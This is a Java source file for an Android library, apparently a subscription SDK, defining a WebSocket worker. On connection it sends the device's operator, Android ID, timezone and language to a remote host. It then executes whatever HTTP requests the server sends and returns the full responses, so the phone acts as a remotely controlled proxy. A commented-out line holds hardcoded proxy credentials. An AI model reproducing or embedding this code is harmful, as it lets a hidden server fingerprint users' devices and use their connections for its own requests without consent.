package com.enhtmv.sublib.work;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.LogUtils;
import com.cp.plugin.http.HttpReqest;
import com.enhtmv.sublib.common.http.SubProxy;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.sub.SubCall;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class WebSocketWorker extends SubCall {


    public WebSocketWorker() {


//        this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 10223));


    }


    @Override
    public void sub(String host) {

//        host = "ws://10.0.2.2:8010/ws";

        OkHttpClient client = new OkHttpClient.Builder().build();

        //ws://10.0.2.2:8010/ws
        final Request request = new Request.Builder().url(host).build();


        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                super.onOpen(webSocket, response);
                LogUtils.i("websocket open");

                Map<String, String> info = new HashMap<>();
                info.put("operator", operator);
                info.put("deviceid", androidId);
                info.put("timezone", TimeZone.getDefault().getID());
                info.put("lang", Locale.getDefault().getLanguage());

                Map<String, Object> data = new HashMap<>();

                data.put("type", "info");
                data.put("data", info);

                webSocket.send(JSON.toJSONString(data));

            }

            @Override
            public void onMessage(final WebSocket webSocket, final String text) {
                super.onMessage(webSocket, text);

                LogUtils.i("websocket message", text);

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            HttpReqest reqest = JSON.parseObject(text, HttpReqest.class);

                            reqest.setHttp(http());

                            SubResponse response = reqest.call();

                            Map<String, Object> data = new HashMap<>();

                            data.put("type", "response");
                            data.put("data", JSON.toJSONString(response));

                            webSocket.send(JSON.toJSONString(data));

                        } catch (Exception e) {
                            LogUtils.e(e);
                        }

                    }
                }).start();
            }

            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                super.onClosing(webSocket, code, reason);
                LogUtils.i("onClosing 关闭websocket连接!");
            }
        });

    }
}
